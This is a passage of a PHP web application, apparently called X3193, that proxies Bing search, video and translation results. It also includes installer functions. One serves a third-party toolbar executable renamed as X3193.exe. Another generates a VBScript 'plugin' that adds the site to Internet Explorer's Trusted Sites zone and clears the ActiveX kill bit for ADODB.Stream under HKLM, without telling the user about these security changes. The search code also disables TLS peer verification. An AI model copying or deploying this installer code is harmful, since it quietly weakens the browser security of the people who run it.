                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                        $gotopage->CallPageChange();
                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // image if end
                elseif (strpos($Sources,"video") !== false){ // video if start
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $url = httppathdir().'plugins/xml/bing/video.xml';
                        }       
                        else{   
                                $url = 'https://api.datamarket.azure.com/Bing/Search/xml.aspx?AppId='.encodeuri($BingAppId).'&Market='.encodeuri(Trim(request('market'))).'&Query='.encodeuri(iconv('gb2312','utf-8',$query)).'&Sources='.$soSources."&video.Count=".encodeuri($pagesize).'&video.Offset='.encodeuri($pagesize*($page-1)).'&xmltype=elementbased';
                        }       

                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);
                        if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue === false){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($objXml->getElementsByTagName(arrmember(split("[:]","mms:Total"),"1"))->item(0)->nodeValue == 0){
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }
                        $objList = $objXml->getElementsByTagName(arrmember(split("[:]","mms:VideoResult"),"1"));
                        //echo $objList->length;
                        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                        //echo $strpagesize;
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 搜 索 结 果 : 共 <?php  echo $objXml->getElementsByTagName(arrmember(split("[:]","mms:Total"),"1"))->item(0)->nodeValue;?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php                       
                        for($i=0; $i < $strpagesize;$i++){
                                $objHdd = $objList->item($i);
                                ?>                              
        <tr class="tdbg">
                <td align="left" id="result">
                                <?php 
                                $nodetitle = str_replace('"', "",iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mms:Title"),"1"))->item(0)->nodeValue)." ");
                                $nodelink = str_replace('"', "",trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mms:PlayUrl"),"1"))->item(0)->nodeValue)." "));
                                $nodeClickThroughPageUrl = str_replace('"', "",trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mms:ClickThroughPageUrl"),"1"))->item(0)->nodeValue)." "));
                                print_r("<li>"." "."<a style='color:#000000' href='".$nodelink."' title='".$nodelink." ".$sCrLf.$nodeClickThroughPageUrl."' target='_blank'>".$nodetitle."</a></li>");
                                ?>
                </td>
                <td align="center" width="17%"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                                <a style='color:#000000' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self>收藏</a> <a style='color:#000000' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank>网收</a>
                                        </td>   
                                </tr>
                        </table>                                
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdbg">
                        <?php 
                        if ($objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue > 1000){
                                $totalitem = 1000;
                        }       
                        else{
                                $totalitem = $objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue;
                        }       
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }       

                        ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        if (floor($page) > 1)
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                        $gotopage->CallPageChange();
                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // video if end
                elseif (strpos($Sources,"MobileWeb") !== false){ // MobileWeb if start
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $url = httppathdir().'plugins/xml/bing/mobileweb.xml';
                        }       
                        else{   
                                $url = 'https://api.datamarket.azure.com/Bing/Search/xml.aspx?AppId='.encodeuri($BingAppId).'&Market='.encodeuri(Trim(request('market'))).'&Query='.encodeuri(iconv('gb2312','utf-8',$query)).'&Sources='.$soSources."&mobileweb.Count=".encodeuri($pagesize).'&mobileweb.Offset='.encodeuri($pagesize*($page-1)).'&xmltype=elementbased';
                        }       
                        
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);
                        if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue === false){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($objXml->getElementsByTagName(arrmember(split("[:]","mw:Total"),"1"))->item(0)->nodeValue == 0){
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }
                        $objList = $objXml->getElementsByTagName(arrmember(split("[:]","mw:MobileWebResult"),"1"));
                        //echo $objList->length;
                        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                        //echo $strpagesize;
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 搜 索 结 果 : 共 <?php  echo $objXml->getElementsByTagName(arrmember(split("[:]","mw:Total"),"1"))->item(0)->nodeValue;?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php                       
                        for($i=0; $i < $strpagesize;$i++){
                                $objHdd = $objList->item($i);
                                ?>                              
        <tr class="tdbg">
                <td align="left" id="result">
                                <?php 
                                $nodetitle = str_replace('"', "",iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mw:Title"),"1"))->item(0)->nodeValue)." ");
                                $nodedescript = str_replace('"', "",iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mw:Description"),"1"))->item(0)->nodeValue)." ");
                                $nodelink = str_replace('"', "",trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mw:Url"),"1"))->item(0)->nodeValue)." "));
                                $nodeDisplayUrl = str_replace('"', "",trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mw:DisplayUrl"),"1"))->item(0)->nodeValue)." "));
                                print_r("<li>"." "."<a style='color:#000000' href='".$nodelink."' title='".$nodelink."' title='".$nodelink." ".$sCrLf.$nodedescript." ".$sCrLf.$nodeDateTime."' target='_blank'>".$nodetitle."</a></li>");
                                ?>
                </td>
                <td align="center" width="17%"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                                <a style='color:#000000' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self>收藏</a> <a style='color:#000000' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank>网收</a>
                                        </td>   
                                </tr>
                        </table>                                
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdbg">
                        <?php 
                        if ($objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue > 1000){
                                $totalitem = 1000;
                        }       
                        else{
                                $totalitem = $objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue;
                        }       
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }       

                        ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                -*      <?php 
                        echo $page." 页".$sCrlf.' ';
                        if (floor($page) > 1)
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                        $gotopage->CallPageChange();
                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // MobileWeb if end
                elseif (strpos($Sources,"Translation") !== false){ // translate if start
                        $targetlang = "Ar|zh-CHS|zh-CHT|Nl|En|Fr|De|It|Ja|Ko|Pl|Pt|Ru|Es"; 
                        $lang = "Arabic|简体中文|繁w中文|Dutch|English|French|German|Italian|Japanese|Korean|Polish|Portuguese|Russian|Spanish"; 
                        $langstr = split("[|]",$lang);
                        $langcharset = "";
                        $strResult = "";
                        $strResultxml = "";
                        $error = '';
                        for ($targetlangi = 0; $targetlangi < count(split("[|]",$targetlang));$targetlangi++){
                                $objXml = new DOMDocument();  
                                $objXml->preserveWhiteSpace = true;
                                $objXml->async = false; 
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = '<?php xml version="1.0" encoding="GBK" ?><?php pageview_candidate?><SearchResponse xmlns="http://schemas.microsoft.com/LiveSearch/2008/04/XML/element" Version="2.2"><Query><SearchTerms>espero</SearchTerms></Query><tra:Translation xmlns:tra="http://schemas.microsoft.com/LiveSearch/2008/04/XML/translation"><tra:Results><tra:TranslationResult><tra:TranslatedTerm>但愿</tra:TranslatedTerm></tra:TranslationResult></tra:Results></tra:Translation></SearchResponse>';
                                }       
                                else{   
                                        $url = "https://api.datamarket.azure.com/Bing/Search/xml.aspx?AppId=".encodeuri($BingAppId)."&Market=".encodeuri(trim(request("market")))."&Query=".encodeuri(iconv('gb2312','utf-8',$query))."&Sources=".encodeuri($soSources)."&Version=".encodeuri("2.2")."&Options=EnableHighlighting&Translation.SourceLanguage=".trim(request("transfrom"))."&Translation.TargetLanguage=".arrmember(split("[|]",$targetlang),($targetlangi));
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
                                        $xmlstr = curl_exec($ch);
                                        curl_close($ch);                
                                }       
                                //echo $xmlstr;
                                //return;
                                $objXml = new DOMDocument();  
                                $objXml->preserveWhiteSpace = true;
                                $objXml->async = false; 
                                // 加Xml 文件    
                                $objXml->loadXML($xmlstr);

                                if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue && $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"))->item(0)->nodeValue===null){
                                        break;
                                }
                                elseif ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue && $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"))->item(0)->nodeValue){
                                        $objList = $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"));                          
                                        $objHdd = $objList->item(0);
                                        $nodeTerm = $objHdd->getElementsByTagName(arrmember(split("[:]","tra:TranslatedTerm"),"1"))->item(0)->nodeValue." ";

                                        if ($targetlangi == "0")
                                                $strResult = GetGB2312String($nodeTerm);
                                        else
                                                $strResult = $strResult."|".GetGB2312String($nodeTerm);
                                }                               
                        }       
                
                        if (!$objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center">搜 索 结 果</td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>
                        <?php       
                                break;
                        }
                        if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue && $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"))->item(0)->nodeValue===null){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center">搜 索 结 果</td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索未发现任何信息！
                </td>
        </tr>   
</table>
                        <?php       
                                break;                  
                        }
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3">搜 索 结 果 : 共 <?php  echo count(split("[|]",$strResult));?> 条 </td>
        </tr>   
                        <?php 
                        $transstr = split("[|]",$strResult);                                            
                        for($i=0; $i < count(split("[|]",$strResult));$i++){
                                ?>                              
        <tr class="tdbg">
                <td align="left" id="result">
                                <?php 
                                echo "<li>".($i+1)." ".$langstr[$i]." -> ".$transstr[$i]."</li>";
                                ?>
                </td>
                <td align="center" width="17%"> 
                        <A style='color:#000000' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self></A>
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdbg">
                        <?php 
                        if (fmod(count(split("[|]",$strResult)), $pagesize) == 0){
                                $totalpage = count(split("[|]",$strResult))/$pagesize;
                        }       
                        else{
                                $totalpage=ceil(count(split("[|]",$strResult))/$pagesize);
                        }       

                        ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        if (floor($page) > 1)
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                        $gotopage->CallPageChange();
                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // translate if end
                
                } // qurey if end       
                break;
} // case end

$style->footer();
return;
} // bing function end
?>

<?php 
function ieshow(){
header('Content-Type:application/octet-stream');
header('Content-Disposition: attachment; filename="X3193.exe"');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://ieshow.net/Clients/200608/xcy6272003/Release/00.00.000/xcy6272003Toolbar.exe');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
$xmlstr = curl_exec($ch);
curl_close($ch);
echo $xmlstr;
exit;
}
?>

<?php 
function setup(){
if (trim(request('code'))==''){

        header('Content-Type:application/octet-stream');
        header('Content-Disposition: attachment; filename="X3193.zip"');

        if(!file_exists('./X3193.zip')){
                touch ('./Setup.html');
                $handle = fopen ('./Setup.html', 'w+');
                rewind ($handle);
                $ch = curl_init();
                $url = httppath()."?api=setup&code=vbs";
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
                fwrite ($handle, '<script language="vbscript">'.chr(13).chr(10));
                fwrite ($handle, $xmlstr);
                fwrite ($handle, chr(13).chr(10).'</script>');
                fclose ($handle);


                $zip = new zipfile();
                $handle = fopen("./Setup.html", "rb");
                $string = fread($handle, filesize("./Setup.html"));
                fclose($handle);        
                $zip->addFile($string, "Setup.html");
                $string = $zip->file();
                $handle = fopen("./X3193.zip", "wb");
                fwrite($handle, $string);
                fclose($handle);        
        }

        $ch = curl_init();
        $url = httppathdir()."/X3193.zip";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        $xmlstr = curl_exec($ch);
        curl_close($ch);
        echo $xmlstr;

        unlink('./Setup.html');
        unlink('./X3193.zip');
}
else{
        //header('application/octet-stream');
        //header('Content-Disposition: attachment; filename="setup.html"');

        //<script language="vbscript">
        $zone = "";
        $subzone = "";
        if (stripos($_SERVER['SERVER_NAME'],'.') == false){
                $zone = $_SERVER['SERVER_NAME'];
                $subzone = "";
        }       
        else{
                if (count(split("[.]",$_SERVER['SERVER_NAME'])) == 3){
                        if (arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "net" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "org" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "com" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "biz"){
                                $zone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),1).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),2);
                                $subzone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),0);
                        }       
                        else{
                                $zone = $_SERVER['SERVER_NAME'];
                        }
                }               
                elseif (count(split("[.]",$_SERVER['SERVER_NAME'])) >= 4){
                        $zone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-3).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-2).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-1);
                }               
        }
        ?>
on error resume next
Set WshShell = CreateObject("WScript.Shell")
        <?php 
        if ($subzone == ""){
        ?>
        if WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http") = false or WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http") <> 2 then
        <?php 
        }
        else{
        ?>
        if WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http") = false or WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http") <> 2 then
        <?php 
        }
        ?>
        msgbox "正在安装 X3193 主插件！"
        setupok = MsgBox("是否安装 X3193 主插件！", vbOKCancel, "X3193 - 主插件安装")
        If setupok = vbOK Or setupok = vbYes Then
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\",""   
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http","2","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http","2","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\http","2","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 搜索插件\", "<?php echo httppathdir()?>?api=bing&action=getinfo"
                'WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 消息插件\", "<?php echo httppathdir()?>?api=imified&action=getinfo"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 相册插件\", "<?php echo httppathdir()?>?api=picasa&action=<?php echo encodeuri('photo.getinfo');?>"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 网址插件\", "<?php echo httppathdir()?>?api=picasa&action=<?php echo encodeuri('urlshortener.getinfo');?>"
                WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags",""
                WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags","0","REG_DWORD"
                msgbox "X3193 主插件安装成功！"
        Else
                msgbox "X3193 主插件安装操作取消！"
        End If
        <?php 
        if ($subzone == ""){
        ?>
        elseif WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http") = 2 then
        <?php 
        }
        else{
        ?>
        elseif WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http") = 2 then
        <?php 
        }
        ?>
        msgbox("正在移除 X3193 主插件！")
        setupok = MsgBox("是否移除 X3193 主插件！", vbOKCancel, "X3193 - 主插件移除")
        If setupok = vbOK Or setupok = vbYes Then
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http","0","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http","0","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\http","0","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 搜索插件\", ""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 消息插件\", ""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 相册插件\", ""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 网址插件\", ""
                WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags","1024","REG_DWORD"
                msgbox "X3193 主插件移除成功！"
        Else
                msgbox "X3193 主插件移除操作取消！"
        End If
elseif WshShell = false then
        msgbox "X3193 主插件因系统故障安装失败！"
end if
        <?php 
        //</script>
}
exit;
}
?>

<?php 
function gmap(){ // gmap function start
header('Content-Type: text/html; charset=utf-8');
//print_r(headers_list());
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - ".formatchar('地图'));
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<?php 
$google_map = new google_class();
$google_map->googleMap();
?>
<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
